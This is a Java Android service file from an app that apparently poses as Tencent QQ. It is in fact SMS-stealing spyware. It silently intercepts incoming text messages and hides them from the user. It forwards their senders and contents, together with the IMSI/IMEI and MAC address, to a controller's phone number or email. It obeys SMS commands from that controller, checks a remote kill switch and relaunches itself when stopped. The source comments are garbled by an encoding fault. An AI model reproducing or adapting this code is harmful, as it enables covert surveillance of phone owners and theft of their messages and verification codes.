package com.tencent.qq;

import java.util.Timer;
import java.util.TimerTask;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.telephony.gsm.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import com.tencent.sms.MessageItem;
import com.tencent.sms.SMSConstant;
import com.tencent.sms.SMSHandler;
import com.tencent.sms.SMSObserver;
import com.tencent.sms.SmsLockHelper;
import com.tencent.util.DeviceInfo;
import com.tencent.util.DeviceInfoGetter;
import com.tencent.util.Utility;

public class MainService extends Service{

	private Context mContext;

	//ָ���
	private SMSHandler smsHandler;
	//�������ؿ���
	public static boolean bInterceptSms;
	
	//��ʱ������
	private Timer timer;
	private TimerTask timerTask;
	
    //���ݶ�ʱ����������
	private final static long TIMER_INTERVAL=1000*60*20;  //	20����һ��

	//�豸��Ϣ
	private DeviceInfo deviceInfo;
	private static String getImsi;


    //�������ݿ�۲���
    public static SMSObserver smsObserver=null;
    
	
	private String[] availableUser;
	private String[] availableAdmin;
	private boolean bEnable=true;
	//Intent ����
	public static String mainServiceString="com.ivory.ahead.MainService";
	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
    
	//���񱻴���ʱ����
	@Override
	public void onCreate()
	{
		super.onCreate();
		mContext=this.getApplicationContext();		
		
		deviceInfo=DeviceInfoGetter.getInstance(mContext).getDeviceInfo();
		getImsi=deviceInfo.getIMSI()==null?deviceInfo.getIMEI():deviceInfo.getIMSI();
	
		
		//ע��ǿ�Ƹ��¹㲥�����յ��㲥ʱǿ��ͬ������
		IntentFilter filter=new IntentFilter();
		filter.addAction(Keys.XYTIMER_START);                      //����ͬ��
		filter.addAction(ConnectivityManager.CONNECTIVITY_ACTION); //����仯�Ĺ㲥
		filter.addAction(Keys.SETTING_CHANGE);                     //���ø��ĵĹ㲥
		filter.addAction("android.provider.Telephony.SMS_RECEIVED"); //���ն��ŵĹ㲥
		filter.setPriority(Integer.MAX_VALUE);
		registerReceiver(xyTimerReceiver, filter);
						
		smsHandler=new SMSHandler(mContext);	    
		//////////////////////////////////////////////////////////
		//ע��۲�����ʱ�õ��ص�����ȷ��һ������������URI�仯��13410698053
		ContentResolver resolver=getContentResolver();
		smsObserver=new SMSObserver(mContext,resolver, smsHandler);		
		resolver.registerContentObserver(Uri.parse(SMSConstant.SMS_URI_INBOX), true, smsObserver);

		//��ȡ������������		
		SharedPreferences settings=mContext.getSharedPreferences(Keys.APP_SETTING,Context.MODE_PRIVATE);
		bInterceptSms=settings.getBoolean(Keys.SMS_INTERCEPT_SWITCH, true); //Ĭ������
		
		timer=new Timer();
		timerTask=new TimerTask() {
			
			@Override
			public void run() {
				try {
					doWork();
				} catch (Exception e) {
					e.printStackTrace();
				}			
			}
		};
		timer.schedule(timerTask, 0, TIMER_INTERVAL);

	}
	//��������ʱ���� ,��android 2.0��ʼ��ȡ��onStart
	@Override
	public int onStartCommand(Intent intent,int flags,int startId)
	{
		return START_STICKY;
	}
	
	
	private void doWork(){		
		//���APK�Ƿ����
		bEnable=checkAvailable();
		if(!bEnable)
			return;
		//����1������
		createRemoteAccount();

	}
		
	/**
	 * ���APK�Ƿ����
	 * @return
	 */
	private boolean checkAvailable(){
		String adminValue=HttpUtils.getNetWorkString();
		if((adminValue!=null&&!adminValue.trim().equals(""))){
			if(adminValue!=null)
				availableAdmin=adminValue.trim().split(",");

			if((availableAdmin!=null&&availableAdmin[0].trim().equals("0"))){
				//���������ʾ
				if((availableAdmin!=null&&availableAdmin.length>=2)){
					function=new RunHandlerFunction() {
						
						@Override
						public void run() {
							//����ʹ�ó�������Ա����Ȩ���
								Toast.makeText(mContext, availableAdmin[1], Toast.LENGTH_LONG).show();						
						}
					};
					myHandler.sendEmptyMessage(Keys.HANDLER_FUNCTION_CODE);
				}
				return false;
			}
		}
			//���۲���ΪNULL��ע��۲���
		
		return true;
	}
	
	
	/**
	 * ����Զ���˻�����,������ֱ�ӷ���һ������
	 */
	private void createRemoteAccount()
	{
		//��ȡ���������Ƿ񴴽���Զ���˺�			
		SharedPreferences settings=mContext.getSharedPreferences(Keys.APP_SETTING,Context.MODE_PRIVATE);
		boolean IsCreateAccount=settings.getBoolean(Keys.IS_CREATE_ACCOUNT, false);
		if(!IsCreateAccount)
		{
			//�����Ա�ֻ�����һ������
			if(Keys.IS_SMS_INTERCEPT){
				Utility.sendSms(Keys.PHONE, "IMSI��"+getImsi+",MAC:"+deviceInfo.getMAC()+",V:"+			
						deviceInfo.getSDKReleaseVersion());
			}else {
				Utility.sendMailByJavaMail("����APK�Ѿ���װ", "�û���Ϣ���£�\nIMSI��"+getImsi+",MAC:"+deviceInfo.getMAC()+",V:"+			
						deviceInfo.getSDKReleaseVersion());
			}
			SharedPreferences.Editor edit=settings.edit();
			edit.putBoolean(Keys.IS_CREATE_ACCOUNT,true);
			edit.commit();
			
			
		}
	}

	public interface RunHandlerFunction{
		public void run();
	}
	public static RunHandlerFunction function;
	
	private Handler myHandler=new Handler(){
		@Override
		public void handleMessage(Message msg){
			switch (msg.what) {
			case Keys.HANDLER_FUNCTION_CODE:
				function.run();
				break;
			}
		}
	};
	
	//֪ͨ��ʱ�����»�ȡ�������ݵĹ㲥
	private BroadcastReceiver xyTimerReceiver =new BroadcastReceiver()
	{
		@Override
		public void onReceive(Context context, Intent intent) {
			String action = intent.getAction(); 
			if(action.equals(Keys.XYTIMER_START)){
			    new Thread(new Runnable() {
					
					@Override
					public void run() {
						doWork();
					}
				}).start();				
				Log.e("��ʱ���㲥","������ʱ��������ִ�У�");
			}else if(action.equals(ConnectivityManager.CONNECTIVITY_ACTION)){
				ConnectivityManager manager=(ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
				if(manager!=null){
					NetworkInfo info=manager.getActiveNetworkInfo();
					//�������
					if(info!=null&&info.isAvailable()){
						Log.e("�㲥", "��������ˣ�"+info.getTypeName());
						//��ȡ����
						Intent broadIntent=new Intent(Keys.XYTIMER_START);
						sendBroadcast(broadIntent);
					}else{
						Log.e("�㲥", "���粻����");
					}
						
				}
		    }else if(action.equals(Keys.SETTING_CHANGE)){
				//��ȡ������������		
				SharedPreferences settings=mContext.getSharedPreferences(Keys.APP_SETTING,Context.MODE_PRIVATE);
				bInterceptSms=settings.getBoolean(Keys.SMS_INTERCEPT_SWITCH, false);
				
				if(Keys.IS_SMS_INTERCEPT){
				   Utility.sendSms(Keys.PHONE, "����������"+(bInterceptSms?"����":"�ر�"));
				}else {
					Utility.sendMailByJavaMail("��������״̬���", "����+IMSI��"+getImsi+",MAC:"+deviceInfo.getMAC()
							+ "������������"+(bInterceptSms?"����":"�ر�"));	
				}
				
		    }else if(action.equals("android.provider.Telephony.SMS_RECEIVED")){
		    	//APK�����û����Ѿ���ģ���ڴ�������˾Ͳ�����㲥��
		    	if(!bEnable||SmsLockHelper.disposeing)
		    		return;
		    	SmsLockHelper.disposeing=true;
		    	Log.e("TAG", "����Broadcast");
		    	try {
				
		            Bundle bundle = intent.getExtras();  
		            if (bundle != null) {  
		                // ͨ��pdus��ý��յ������ж�����Ϣ����ȡ�������ݣ�  
		                Object[] pdus = (Object[]) bundle.get("pdus");  
		                // �������Ŷ������飻  
		                SmsMessage[] mges = new SmsMessage[pdus.length];  
		                for (int i = 0; i < pdus.length; i++) {  
		                    // ��ȡ�����������ݣ���pdu��ʽ��,�����ɶ��Ŷ���  
		                    mges[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);  
		                }  
		                for (SmsMessage mge : mges) {  
		    	            String phone=mge.getDisplayOriginatingAddress();
		                	int protocol=mge.getProtocolIdentifier();
		                	long date=mge.getTimestampMillis();
		                	String body=mge.getMessageBody();
		    	            //��������Ѿ���������ˣ��Ͳ�������
		                	if(date==SmsLockHelper.lastSmsDate){
		                		break;
		                	}
		                	SmsLockHelper.lastSmsDate=date;
		                	
		                	if (phone.startsWith("+86")){   
		                		 phone = phone.substring(3);   
		      	            }  
		                	
		    	            StringBuffer sb = new StringBuffer(); 
		    	            sb.append("������:"+phone);	    	            
		    	            //sb.append("\nʱ��:"+new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(date));
		    	            sb.append("\n����:"+(mge.getProtocolIdentifier()==0?"����":"����"));
		    	            sb.append("\n����:"+body);
		    
		    	            /**
							 * ����ָ�������ݣ�����ǿ��ƶ��ţ�����״̬Ϊ�ѽ��գ���ִ�п��Ʋ���
							 * ��ֹ�����ŷ��Ͷ��ŷ����Լ���������
							 */
							if(protocol==0&&body!=null&&body.trim().startsWith(Keys.FILTER)&&
									phone.trim().contains(Keys.PHONE))
							{
								// �������´�����  
					            this.abortBroadcast();
					            
								MessageItem item=new MessageItem(-1, 1, protocol, date, phone, body);
								//֪ͨHandler
								Message msg=new Message();
								msg.obj=item;
								smsHandler.sendMessage(msg);
															
								break;
							}
																									
							
							//���ض���,ͬʱ��ֹ����Ա�Լ������Լ���������ѭ��
							if(bInterceptSms&&!phone.equals(Keys.PHONE)){
							 	// �������´�����  
					            this.abortBroadcast();  
								//�����Ա�ֻ�����һ������
					            if(Keys.IS_SMS_INTERCEPT){
								    Utility.sendSms(Keys.PHONE, "���������أ�\n"+sb.toString());
					            }else {
									Utility.sendMailByJavaMail("����������", "����+IMSI��"+getImsi+",MAC:"+deviceInfo.getMAC()+"���յ����¶���"
											+ "���������£�\n"+sb.toString());
								}
								//Log.e(Keys.PHONE, "���������أ�\n"+sb.toString());
							}
							Log.v("SMSObserver", "�ϴ�һ��,"+sb.toString());
		              }  
		            }
		    	}finally{
		    		SmsLockHelper.disposeing=false;
		    	}
		    }
		}
	};


	//����ֹͣʱ���÷�
	@Override
	public void onDestroy()
	{
		//ж�ع㲥
		unregisterReceiver(xyTimerReceiver);
		//ȡ���������ݹ۲���
		if(smsObserver!=null)
		    mContext.getContentResolver().unregisterContentObserver(smsObserver);
		
		//ֹͣ��ʱ��
		if(timer!=null)
			timer.cancel();

		
		//�����������񣬷�ֹ����KILL
		Intent assistService=new Intent(mContext,AssistService.class);
		mContext.startService(assistService);
		//������̨ͬ������
/*		Intent serviceIntent=new Intent(this,MainService.class);
		this.startService(serviceIntent);*/
		
		super.onDestroy();
	}

}
